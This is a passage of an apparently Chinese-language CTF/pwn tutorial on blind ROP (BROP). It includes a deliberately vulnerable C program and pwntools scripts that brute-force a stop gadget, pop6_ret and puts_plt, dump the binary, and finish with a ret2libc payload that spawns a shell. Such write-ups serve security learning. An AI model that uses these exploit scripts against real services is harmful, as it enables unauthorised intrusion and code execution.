class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>BROP（没有二进制程序，只有一个程序服务）</strong></p>
+<p>brop 一种没有二进制程序，只有一个程序服务的情况下，该程序存在栈溢出，可以通过栈溢出和程序特性进行 ROP 攻击并且提权的攻击方法。</p>
+<p>利用前提：</p>
+<ol>
+<li><p>存在栈溢出漏洞</p>
+</li>
+<li><p>没有开启 canary 或者 开启 pie</p>
+</li>
+<li><p>即使开启了 canary 或者 开启了 pie。但是 canary 和 pie 不变，这样就能够爆破得到 canary 和 pie。(多线程)</p>
+</li>
+</ol>
+<p> </p>
+<p>例题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc brop.c -o brop -fno-stack-protector -no-pie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这种题型是不会给任何文件的</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="brop-如何判断是否存在-canary-和-pie"><a href="#brop-如何判断是否存在-canary-和-pie" class="headerlink" title="brop 如何判断是否存在 canary 和 pie"></a>brop 如何判断是否存在 canary 和 pie</h3><p>如果存在 canary 则显示</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps337.jpg" alt="wps337"> </p>
+<p>这正是因为有___stack_chk_fail输出的</p>
+<p>如果没有开启 canary</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps338.jpg" alt="wps338"> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps339.jpg" alt="wps339"> </p>
+<p> </p>
+<p>PS : 也有可能是溢出长度不够，那么这样就可以增加溢出长度测试， &lt; 0x1000</p>
+<p>回头看这道题目，明显这道题目没有 canary ，默认没有开启 pie，很难去控制 pie 是不变。除非是一个多线程的，比如程序因为栈溢出崩溃了但是，还是在继续进行，此时pie和canary就是不变的</p>
+<p>如果是多线程题目，那么也是很容易去通过溢出判断的，即程序 crash （崩溃）后，还能继续重启，继续让你输入。</p>
+<p> </p>
+<p>下面我们就是开始模拟，题目没有提供源程序文件，我们只能连接他提供的远程服务：</p>
+<h3 id="STEP-1-获取-stop-gadget-start-函数地址"><a href="#STEP-1-获取-stop-gadget-start-函数地址" class="headerlink" title="STEP 1 : 获取 stop_gadget ( _start 函数地址 )"></a>STEP 1 : 获取 stop_gadget ( _start 函数地址 )</h3><p>stop_gadget 是一个可以帮助我们判断其它 gadget 的一个帮助指令，执行 stop_gadget 后，程序会自动挂起</p>
+<p>难点 ： 溢出长度不确定。没有解决方法，只能爆破</p>
+<p>爆破函数代码如下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_stop_gadget</span>(<span class="params">buf_size, start_addr = <span class="number">0x400000</span>, end_addr = <span class="number">0x401000</span></span>):</span><br><span class="line"></span><br><span class="line">    stop_gadget = start_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        stop_gadget += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stop_gadget &gt; end_addr):</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(stop_gadget)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            p.sendafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stop_gadget</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;not 0x%x, try harder!&quot;</span>, stop_gadget)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_gadget</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8</span>, <span class="number">0x100</span>, <span class="number">8</span>):<span class="comment">#由于64位栈的每一行都是8字节，一般情况下溢出都是8的倍数，但是不排除其他情况，那样就要一个个字节爆破溢出很慢</span></span><br><span class="line"></span><br><span class="line">rl = find_stop_gadget(i, <span class="number">0x400000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(rl):</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;find one stop gadget: 0x%x&quot;</span>, rl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果在爆破过程当中卡住了，则说明溢出长度已经被找到了，并且该爆破地址是程序当中 plt 表的地址。</p>
+<p>通过爆破可以知道，stop_gadget 为 0x400570</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps340.jpg" alt="wps340"> </p>
+<h3 id="ELF-程序特性之一-：-固定存在的-pop6-ret-及其意义"><a href="#ELF-程序特性之一-：-固定存在的-pop6-ret-及其意义" class="headerlink" title="ELF 程序特性之一 ： 固定存在的 pop6_ret 及其意义"></a>ELF 程序特性之一 ： 固定存在的 pop6_ret 及其意义</h3><p>可以发现，平时所使用的 pop rdi ; ret 和 pop rsi; pop r15 ; ret ，都是从 pop6_ret 截取出来的（看硬编码）</p>
+<p>程序IDA进去看确是这样的</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps341.jpg" alt="wps341"> </p>
+<p>所以可以知道下面这有些都是上面得截取拼接出来的</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps342.jpg" alt="wps342"> </p>
+<p>而 pop6_ret 是 __libc_csu_init 函数里所固有的，就是上面白色的IDA截图里的。</p>
+<p>PS : ret2csu 的一个好处，就是能够控制 rdx 。</p>
+<p>gcc - 11 之后的版本，取消了 pop6_ret 这个指令。这也是编译时候的一个安全保护</p>
+<p><strong>### STEP 2 :  获取 pop rdi ; ret -&gt; pop6_ret 指令</strong></p>
+<p>爆破方法 : 即利用 pop6_ret 的独特性</p>
+<p> </p>
+<p>判断是否最后又回到stop_gadget(_start) 函数正常打印输出结果，来判断是否弹出到了六个寄存器里</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(pop6_ret) + p64(<span class="number">1</span>)*<span class="number">6</span> + p64(stop_gadget))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>明显的，直接爆破 pop rdi ; ret 是不可行的，可能是弹到了别的寄存器里，也能正常执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(stop_gadget))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为不能保证爆出的一定是 pop_rdi_ret</p>
+<p>爆破函数代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pop6_ret</span>(<span class="params">buf_size, stop_gadget, start_addr = <span class="number">0x400000</span>, end_addr = <span class="number">0x401000</span></span>):</span><br><span class="line"></span><br><span class="line">    pop6_ret = start_addr</span><br><span class="line"></span><br><span class="line">    stop_gadget = stop_gadget</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        pop6_ret += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(pop6_ret &gt; end_addr):</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&#x27;not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(pop6_ret) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(stop_gadget)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            p.sendafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">            resp = p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;find one stop_gadget: 0x%x&quot;</span>, pop6_ret)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;&gt;&gt;&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                    payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(pop6_ret)</span><br><span class="line"></span><br><span class="line">                    p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    p.sendafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">                    p.recv()</span><br><span class="line"></span><br><span class="line">                    p.close()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                    p.close()</span><br><span class="line"></span><br><span class="line">                    log.info(<span class="string">&quot;find useful gadget: 0x%x&quot;</span>, pop6_ret)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> pop6_ret</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;not 0x%x,try harder&quot;</span>, pop6_ret)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一种，即 pop6_ret 是 main 函数地址时候</p>
+<p>这个时候，如果再次发送如下的 payload</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(pop6_ret)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果 pop6_ret 是 main_addr ，那么又会重新回到 main 函数，即程序又有输出</p>
+<p>如果 pop6_ret 是 pop6_ret ，那么程序就回不到 main 函数了</p>
+<p>根据这两者的差异，就可以判断 pop6_ret 是不是一个 main 函数（也能够确认 main 函数地址）</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps343.jpg" alt="wps343"> </p>
+<p>可以找到 pop6_ret 为 0x40075a ，pop rdi ; ret 的地址就是 0x40075a + 9 ，ret 的地址就是 0x40075a + 0xa，这个加上的便宜是固定的记住就好</p>
+<h3 id="ELF-程序特性之二-：-ELF程序固定的数据头"><a href="#ELF-程序特性之二-：-ELF程序固定的数据头" class="headerlink" title="ELF 程序特性之二 ： ELF程序固定的数据头"></a>ELF 程序特性之二 ： ELF程序固定的数据头</h3><p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps344.jpg" alt="wps344"> </p>
+<p>可以看到，ELF程序固定的前四个字节为 \x7fELF，即 0x400000 -&gt; \x7fELF</p>
+<p><strong>### STEP 3 : 获取 puts_plt</strong></p>
+<p>由于我们已经能够控制 rdi ，接下来，我们只需要爆破 puts_plt，如果能够输出 \x7fELF ，则说明获取到的是 puts_plt</p>
+<p>爆破函数代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_puts_plt</span>(<span class="params">buf_size, stop_gadget, start_addr = <span class="number">0x400000</span>, end_addr = <span class="number">0x401000</span></span>):</span><br><span class="line"></span><br><span class="line">    elf_magic_addr = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">    puts_plt = start_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        puts_plt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(rdi) + p64(elf_magic_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            p.sendafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">            resp1 = p.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            resp2 = p.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> resp1 <span class="keyword">and</span> <span class="string">b&#x27;&gt;&gt;\n&#x27;</span> <span class="keyword">in</span> resp2:</span><br><span class="line"></span><br><span class="line">                p.close()</span><br><span class="line"></span><br><span class="line">                log.info(<span class="string">&quot;puts_plt: 0x%x&quot;</span>, puts_plt)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> puts_plt</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;find one stop gadget: 0x%x&quot;</span>, puts_plt)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;not 0x%x, try harder&quot;</span>, puts_plt)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实这个地址可以有很多，因为都可以截取，执行到puts函数，比如爆破出0x0400515也可以用</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps345.jpg" alt="wps345"> </p>
+<h3 id="STEP-4-dump-程序"><a href="#STEP-4-dump-程序" class="headerlink" title="STEP 4 : dump 程序"></a>STEP 4 : dump 程序</h3><p>获取了 puts_plt 之后，我们就已经能够泄露这个程序的二进制信息</p>
+<p>爆破函数代码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_memory</span>(<span class="params">buf_size, stop_gadget, puts_plt, start_addr=<span class="number">0x400000</span>, end_addr = <span class="number">0x401000</span></span>):</span><br><span class="line"></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * buf_size + p64(rdi) + p64(start_addr) + p64(puts_plt)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            p.sendafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">            resp1 = p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> resp1 == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                resp = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> resp1[-<span class="number">1</span>:] == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                log.info(<span class="string">&quot;[tail]leaking: 0x%x --&gt; %s&quot;</span> % (start_addr, (resp <span class="keyword">or</span> <span class="string">b&#x27;&#x27;</span>).<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">                resp = resp1[:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                resp = resp1</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> resp != resp1:</span><br><span class="line"></span><br><span class="line">                log.info(<span class="string">&quot;[change]resp1: 0x%x: %s --&gt; resp1: 0x%x: %s&quot;</span> % (start_addr, (resp1 <span class="keyword">or</span> <span class="string">b&#x27;&#x27;</span>).<span class="built_in">hex</span>(), start_addr, (resp <span class="keyword">or</span> <span class="string">b&#x27;&#x27;</span>).<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (start_addr, (resp <span class="keyword">or</span> <span class="string">b&#x27;&#x27;</span>).<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">            result += resp</span><br><span class="line"></span><br><span class="line">            start_addr += <span class="built_in">len</span>(resp)</span><br><span class="line"></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">&quot;connect error&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pwn&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">   f.write(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意：因为 puts 函数输出字符串末尾自带 \n ，所以我们要把 \n 删去，以防影响 dump 程序结果</p>
+<h3 id="STEP-5-：获取-puts-got"><a href="#STEP-5-：获取-puts-got" class="headerlink" title="STEP 5 ：获取 puts_got"></a>STEP 5 ：获取 puts_got</h3><p>获取 puts_got 是为了能够 leak puts_addr ，以便能够确定远程靶机的 libc 版本。</p>
+<p> </p>
+<p>在plt表中有一些公共表项，会跳到got表去执行。就因为它是_init_proc后的第一个函数，所以就可以判断这里是公共表项，再判断他是puts函数got表</p>
+<p>将 dump 下来的内存丢入 IDA</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps346.jpg" alt="wps346"> </p>
+<p>通过上图即可判断出 puts_got -&gt; 0x601018</p>
+<h3 id="STEP-6-获取-libc-版本"><a href="#STEP-6-获取-libc-版本" class="headerlink" title="STEP 6 : 获取 libc 版本"></a>STEP 6 : 获取 libc 版本</h3><p>python 工具 ： LibcSearcher 用在 exp 脚本里面的，可以获取 libc 版本</p>
+<p>在线网站 ： <a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
+<h3 id="STEP-7：打-ret2libc"><a href="#STEP-7：打-ret2libc" class="headerlink" title="STEP 7：打 ret2libc"></a>STEP 7：打 ret2libc</h3><p>到这一步就很简单了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(rdi) + p64(<span class="number">0x601018</span>) + p64(puts_plt) + p64(stop_gadget))</span><br><span class="line"></span><br><span class="line">libc_base = l64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">ret = pop6_ret + <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line">system, binsh = get_sb()</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system))</span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
